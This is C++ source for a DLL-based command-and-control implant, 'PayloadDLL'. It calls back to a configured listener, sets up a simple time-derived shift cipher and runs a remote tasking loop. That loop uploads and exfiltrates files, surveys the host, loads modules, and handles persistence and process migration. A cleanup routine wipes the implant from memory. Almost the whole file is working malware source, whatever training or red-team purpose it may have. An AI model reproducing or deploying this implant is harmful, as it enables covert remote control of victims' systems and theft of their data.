/*
    dllmain.cpp

    Main source file for PayloadDLL.dll, the standard DLL form of our CNC implant
*/
#define WIN32_LEAN_AND_MEAN

#pragma warning( disable : 4201 )    // Disable warning about 'nameless struct/union'

#include "../shared/Config.h"

#pragma comment(lib, "Ws2_32.lib")

/*extern "C"*/ __declspec(dllexport) void APIENTRY Payload(PCONFIG Config);

bool APIENTRY DllMain( HMODULE hModule,
                       uint32_t  ul_reason_for_call,
                       void* lpReserved
                     )
{
    (void)hModule;
    (void)lpReserved;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return true;
}


/*
* @brief Starts WSA functionality and sets up the socket connection with an active server
* @param Config a context structure for connection and runtime data
* @return SOCKET of the connected server or 0 if unsuccessful
*/
SOCKET ConnectToListener(PCONFIG Config)
{
    // Initialize Winsock
    WSADATA wsaData = { 0 };
    int error = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (error) {
        return 0;
    }

    // Connect to listener
    SOCKET ListenerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ListenerSocket == INVALID_SOCKET) {
        WSACleanup();
        return 0;
    }

    SOCKADDR_IN listenerService = { 0 };
    listenerService.sin_family = AF_INET;
    listenerService.sin_addr.s_addr = Config->ListenerIpAddress;
    listenerService.sin_port = Config->ListenerPort;
    error = connect(ListenerSocket, (SOCKADDR*)&listenerService, sizeof(listenerService));
    if (error == SOCKET_ERROR) {
        WSACleanup();
        return 0;
    }

    return ListenerSocket;
}


/*
* @brief Encrypts the data bytes using the shift key values in the config (shift right)
* @param Config a context structure for connection and runtime data
* @param Length of the data to be encrypted
* @param Data pointer to data buffer to be encrypted
* @return bool, true for success
*/
bool EncryptData(PCONFIG Config, uint32_t Length, uint8_t* Data)
{
    for (unsigned idx = 0; idx < Length; idx++)
    {
        unsigned shift = Config->KeyShifts[idx % KEY_LENGTH];
        *(Data + idx) = (uint8_t)(*(Data + idx) + shift);
    }
    return true;
}


/*
* @brief Decrypts the data bytes using the shift key values in the config (shift left)
* @param Config a context structure for connection and runtime data
* @param Length of the data to be decrypted
* @param Data pointer to data buffer to be decrypted
* @return bool, true for success
*/
bool DecryptData(PCONFIG Config, uint32_t Length, uint8_t* Data)
{
    for (unsigned idx = 0; idx < Length; idx++)
    {
        unsigned shift = Config->KeyShifts[idx % KEY_LENGTH];
        *(Data + idx) = (uint8_t)(*(Data + idx) - shift);
    }
    return true;
}

/*
* @brief send data to the server from the buffer until full length has been sent
* @param sock active socket with the server
* @param data pointer to the data buffer
* @param len length of the data buffer to be sent
* @param flags, connection flags
* @return int total bytes sent
*/
int FullSend(SOCKET sock, char* data, int len, int flags)
{
    // send it!
    int BytesSent = 0;
    while (BytesSent < len) {
        int ChunkSize = send(sock, data + BytesSent, len - BytesSent, flags);
        if (ChunkSize == SOCKET_ERROR)
            return SOCKET_ERROR;
        BytesSent += ChunkSize;
    }
    return BytesSent;
}

/*
* @brief
* @param Config a context structure for connection and runtime data
* @param ListenerSocket active socket with the server
* @param Type the Enum value specifying the type of message being sent
* @param Length of the data to be sent
* @param Data pointer to the data buffer
* @return 0 for success
*/
int SendMsg(PCONFIG Config, SOCKET ListenerSocket, MESSAGE_TYPE Type, uint32_t Length, uint8_t* Data)
{
    (void)Config;
    MESSAGE Header = { (uint32_t)Type, Length };
    FullSend(ListenerSocket, (char*)&Header, sizeof(Header), 0);
    if (Header.Length)
    {
        if (Type != REQUEST_TASKING && Length > 0)
        {
            EncryptData(Config, Length, Data);
        }
        FullSend(ListenerSocket, (char*)Data, Length, 0);
    }
    return 0;
}


/*
* @brief Receive a message from the server, allocate a buffer to receive its contents, and decrypt it
* @param Config a context structure for connection and runtime data
* @param ListenerSocket active socket with the server
* @return PMESSAGE received message structure
*/
PMESSAGE RecvMsg(PCONFIG Config, SOCKET ListenerSocket)
{
    MESSAGE Header = { 0 };
    recv(ListenerSocket, (char *)&Header, sizeof(Header), MSG_WAITALL);

    // guard against heap overflow
    if ((uint32_t)(sizeof(Header) + Header.Length) < Header.Length)
    {
        SendMsg(Config, ListenerSocket, ERR, 0, NULL);
        return NULL;
    }

    PMESSAGE Message = (PMESSAGE) HeapAlloc(GetProcessHeap(), 0, Header.Length + sizeof(Header));
    if (Message == NULL)
    {
        // TODO: Error reporting?
        return NULL;
    }
    Message->Type = Header.Type;
    Message->Length = Header.Length;
    if (Message->Length)
    {
        recv(ListenerSocket, (char*)Message->Value, Message->Length, MSG_WAITALL);
    }

    DecryptData(Config, Message->Length, Message->Value);

    return Message;
}


/*
* @brief Uses the current system time and pre-shared modulo numbers to create a shift key sequence.
* Sends the key base to the server for shift key generation.
* @param Config a context structure for connection and runtime data
* @param ListenerSocket active socket with the server
* @return bool true on success
*/
bool EstablishKey(PCONFIG Config, SOCKET ListenerSocket)
{
    // Generate an encryption key base from the system time
    SYSTEMTIME systemTime;
    GetSystemTime(&systemTime);
    uint32_t keySum = systemTime.wHour + systemTime.wMinute + systemTime.wSecond + systemTime.wMilliseconds;
    Config->KeyShifts[0] = keySum % PRIME1;
    Config->KeyShifts[1] = keySum % PRIME2;
    Config->KeyShifts[2] = keySum % PRIME3;
    Config->KeyShifts[3] = keySum % PRIME4;
    // send request tasking message to server with keySum
    SendMsg(Config, ListenerSocket, REQUEST_TASKING, sizeof(uint32_t), (uint8_t*) &keySum);
    return true;
}

/*
* @brief
* @param Config a context structure for connection and runtime data
* @param ListenerSocket active socket with the server
* @return true for success, false for failure
*/
bool ProcessTasking(PCONFIG Config, SOCKET ListenerSocket)
{
    PMESSAGE Message = NULL;
    unsigned  DataLen = 0;
    uint8_t * Data = NULL;

    do {
        // clear / free previous message
        if (Message)
        {
            HeapFree(GetProcessHeap(), 0, Message);
            Message = NULL;
        }
        // clear / free previous message data length and contents
        DataLen = 0;
        if (Data)
        {
            HeapFree(GetProcessHeap(), 0, Data);
            Data = NULL;
        }
        // blocking receive for new message
        Message = RecvMsg(Config, ListenerSocket);
        if (Message == NULL) {
            break;
        }

        bool status = false;
        bool missModule = false;

        switch (Message->Type) {
        case PUT_FILE:
            status = PutFile(Config, Message);
            break;
        case GET_FILE:
            status = GetFile(Config, Message, &DataLen, &Data);
            break;
        case SURVEY:
            status = Survey(Config, Message, &DataLen, &Data);
            break;
        case ADD_MODULE:
            status = AddModule(Config, Message);
            break;
        case PERSIST:
            if (Config->Modules->Persist == NULL)
            {
                missModule = true;
                break;
            }
            status = (*Config->Modules->Persist)((uint8_t *)Config, Message);
            break;
        case MIGRATE:
            if (Config->Modules->Migrate == NULL)
            {
                missModule = true;
                break;
            }
            status = (*Config->Modules->Migrate)((uint8_t *)Config, Message);
            break;
        case TEST:
            if (Config->Modules->Test == NULL)
            {
                missModule = true;
                break;
            }
            status = (*Config->Modules->Test)((uint8_t *)Config, &DataLen, &Data);
            break;
        case TASKING_DONE:
            // shutdown
            break;
        case DISCONNECT:
            // server is sending a socket shutdown, proceed to implant shutdown
            Message->Type = TASKING_DONE;
            break;
        default:
            DBGPRINT(Config->Imports->DbgPrint, "Unknown Message Type Received.\n");
            DBGPRINT(Config->Imports->DbgPrint, "Type: %u\n", Message->Type);
            if (Message->Length)
            {
                DBGPRINT(Config->Imports->DbgPrint, "Length: %u\n", Message->Length);
                DBGPRINT(Config->Imports->DbgPrint, "Value: 0x%0.*x\n", Message->Length, Message->Value);
            }
            SendMsg(Config, ListenerSocket, ERR, 0, NULL);
            continue;
        }

        // respond to server with missing code if requested module was missing
        if (missModule)
        {
            SendMsg(Config, ListenerSocket, MISS, 0, NULL);
        }
        // respond to server with success and data (if applicable)
        else if (status && DataLen)
        {
            SendMsg(Config, ListenerSocket, OK, DataLen, Data);
        }
        else if (status)
        {
            SendMsg(Config, ListenerSocket, OK, 0, NULL);
        }
        // if status is false, return an error to the server
        else
        {
            SendMsg(Config, ListenerSocket, ERR, 0, NULL);
        }
    } while (Message->Type != TASKING_DONE);

    // post-break
    if (Data)
    {
        HeapFree(GetProcessHeap(), 0, Data);
    }
    if (Message)
    {
        HeapFree(GetProcessHeap(), 0, Message);
        return true;
    }
    // if message received was empty
    return false;
}


/*
* @brief Reset Config structure (and substructure) memory to zero. Does not clean currently executing implant code
* @param Config a context structure for connection and runtime data
* @return void
*/
void Cleanup(PCONFIG Config)
{
    /* Things to clean:
    * [X] ModuleX Data: VirtualAlloc / ZeroMemory + VirtualFree
    * [X] Modules Struct: stack / ZeroMemory
    * [X] Config Imports: stack / ZeroMemory
    * [X] Config Struct: stack / ZeroMemory
    */
    // Clean all loaded module data (zero then free)
#pragma warning (push)
#pragma warning (disable:6001)
    for (int idx = 0; idx < sizeof(MODULES); idx += sizeof(void(*)()))
    {
        uint8_t ** modulesPtr = (uint8_t **) ((uint8_t *)Config->Modules + idx);
        uint8_t * module = *(modulesPtr);
        if (!module)
        {
            continue;
        }
        MEMORY_BASIC_INFORMATION moduleMbi;
        if (!VirtualQuery((LPCVOID) module, &moduleMbi, sizeof(moduleMbi))) {
            DBGPRINT(Config->Imports->DbgPrint, "(Cleanup) Failed to query virtual page of module\n");
        }
        size_t moduleSize = moduleMbi.RegionSize;
        SecureZeroMemory((void *) module, moduleSize);
        if (!VirtualFree((LPVOID) module, 0, MEM_RELEASE))
        {
            DBGPRINT(Config->Imports->DbgPrint, "(Cleanup) Failed to free virtual page of module\n");
        }
    }
#pragma warning (pop)

    // Clean modules struct
    SecureZeroMemory(Config->Modules, sizeof(MODULES));

    // Free DLL that was loaded in (the implant)
    // get the start address of the DLL this function is being called from
    HMODULE dllBase;
    if (!GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCSTR)Cleanup, &dllBase))
    {
        DBGPRINT(Config->Imports->DbgPrint, "(Cleanup) Failed to get DLL module handle from given address\n");
    }

    // attempt to get size of library and zero it
    /*
    MEMORY_BASIC_INFORMATION dllMbi;
    if (!VirtualQuery(dllBase, &dllMbi, sizeof(dllMbi))) {
        DBGPRINT(Config->Imports->DbgPrint, "(Cleanup) Failed to query virtual pages of DLL\n");
    }
    size_t dllSize = dllMbi.RegionSize;

    DWORD oldProtect;
    int status = VirtualProtect(dllBase, dllSize, PAGE_EXECUTE_READWRITE, &oldProtect);

    SecureZeroMemory(dllBase, dllSize);
    */

    // free the DLL space, note that this doesn't zero it out
    // ** logically this shouldn't work as it would be free the current code execution space, but it hasn't crashed in my testing
    /*if (!FreeLibrary(dllBase))
    {
        DBGPRINT(Config->Imports->DbgPrint, "(Cleanup) Failed to free DLL module memory\n");
    }
    */
    WSACleanup();

    // Zero out struct data
    SecureZeroMemory(Config->Imports, sizeof(IMPORTS));
    SecureZeroMemory(Config, sizeof(CONFIG));
}

/*
* @brief Implant entry point, loads and links necessary libraries / procedures,
* initializes context structures, establishes socket and encryption key then runs tasking loop.
* @param Config a context structure for connection and runtime data
* @return void
*/
/*extern "C"*/ __declspec(dllexport) void APIENTRY Payload(PCONFIG Config)
{
    IMPORTS Imports;
    if (!LinkImports(&Imports))
    {
        return; // Error importing? Guess I'll die \_O_/
    }
    Config->Imports = &Imports;
    DBGPRINT(Config->Imports->DbgPrint, "Link Imports: Success\n", NULL);

    MODULES Modules;
    SecureZeroMemory(&Modules, sizeof(Modules));
    Config->Modules = &Modules;

    SOCKET ListenerSocket = ConnectToListener(Config);
    if (!ListenerSocket) {
        // No way to phone home if this failed, just die silently
        DBGPRINT(Config->Imports->DbgPrint, "Connect to Server: Failure\n", NULL);
        return;
    }
    DBGPRINT(Config->Imports->DbgPrint, "Connect to Server: Success\n", NULL);

    Config->Socket = ListenerSocket;

    EstablishKey(Config, ListenerSocket);

    ProcessTasking(Config, ListenerSocket);

    Imports.CloseSocket(ListenerSocket);

    Cleanup(Config);
}
